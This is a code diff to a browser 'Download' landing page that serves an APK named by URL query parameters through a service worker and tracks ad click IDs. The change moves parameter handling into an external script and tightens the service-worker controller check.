@@ -5,11 +5,13 @@
   <meta name="google" content="notranslate">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Download</title>
+  <script src="../params.js?v=1-params-1"></script>
   <script>
-    window.__downloadTestRevision = '12';
+    window.__downloadTestRevision = '1-params-1';
     window.__downloadSwVersion = 'b623f123';
     window.__downloadSwUrl = `../sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
     window.__swReadyPromise = (async () => {
+      await window.__landingParamsReady;
       if (!('serviceWorker' in navigator)) {
         return { ok: false, direct: true, reason: 'unsupported' };
       }
@@ -23,7 +25,8 @@
 
       await navigator.serviceWorker.ready;
 
-      if (!navigator.serviceWorker.controller) {
+      const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
+      if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
         await new Promise((resolve, reject) => {
           const timeout = window.setTimeout(() => {
             navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
@@ -31,11 +34,13 @@
           }, 5000);
 
           function onControllerChange() {
+            if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
+            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
             window.clearTimeout(timeout);
             resolve();
           }
 
-          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange, { once: true });
+          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
         });
       }
 
@@ -237,9 +242,9 @@
     const scalePercentText = document.querySelector('.scale-percent');
     const downloadButtonBox = document.querySelector('.d-button-box');
 
-    const pageUrl = new URL(window.location.href);
-    const apkUrl = getApkUrlFromQuery();
-    const fileName = getFileNameFromQuery();
+    let savedParams = new URLSearchParams();
+    let apkUrl = null;
+    let fileName = DEFAULT_FILE_NAME;
     let isServiceWorkerReady = false;
     let isDirectDownloadMode = false;
     let trustedClickCount = 0;
@@ -254,66 +259,19 @@
       console.log(`[download] ${message}`, data);
     }
 
-    function sanitizeFileName(value) {
-      const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
-      const candidate = String(value || '')
-        .replace(/\.apk$/i, '')
-        .slice(0, 80);
-      const isValid = candidate !== ''
-        && !/^[ _-]+$/.test(candidate)
-        && !/^ /.test(candidate)
-        && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
-      const base = isValid ? candidate : fallbackBase;
-      return `${base}.apk`;
-    }
-
-    function getApkUrlFromQuery() {
-      const value = pageUrl.searchParams.get('u');
-      if (value) {
-        try {
-          const target = new URL(value);
-          if (!['http:', 'https:'].includes(target.protocol)) {
-            return null;
-          }
-
-          return target.href;
-        } catch (error) {
-          return null;
-        }
-      }
-
-      const domain = pageUrl.searchParams.get('domain');
-      const path = pageUrl.searchParams.get('p');
-      if (!domain || !path) {
-        return null;
-      }
-
-      const cleanDomain = domain
-        .replace(/^https?:\/\//i, '')
-        .replace(/\/.*$/, '');
-      const cleanPath = path.replace(/^\/+/, '').replace(/\/+$/, '');
-      const target = new URL(`https://${cleanDomain}/${cleanPath}/`);
-
-      pageUrl.searchParams.forEach((paramValue, key) => {
-        if (!['u', 'domain', 'p', 'name', 'filename'].includes(key)) {
-          target.searchParams.set(key, paramValue);
-        }
-      });
-
-      return target.href;
-    }
-
-    function getFileNameFromQuery() {
-      return sanitizeFileName(pageUrl.searchParams.get('utm_medium'));
-    }
-
     function getRedirectUrl() {
       const target = new URL(REDIRECT_HREF);
-      target.searchParams.set('clickid', pageUrl.searchParams.get('clickid') || '');
+      target.searchParams.set('clickid', savedParams.get('clickid') || '');
       return target.href;
     }
 
     async function registerServiceWorker() {
+      await window.__landingParamsReady;
+      savedParams = window.__savedDownloadParams;
+      apkUrl = Landing1Params.apkUrl(savedParams);
+      fileName = Landing1Params.sanitizeFileName(savedParams.get('utm_medium'));
+      const title = document.querySelector('#fileTitle');
+      if (title) title.textContent = fileName;
       const swState = await window.__swReadyPromise;
 
       if (!swState.ok || swState.direct) {
@@ -338,8 +296,6 @@
       }
 
       const target = new URL('../download.apk', window.location.href);
-      target.searchParams.set('src', apkUrl);
-      target.searchParams.set('name', fileName);
 
       if (isDirectDownloadMode) {
         log('starting direct download fallback', { apkUrl, fileName });
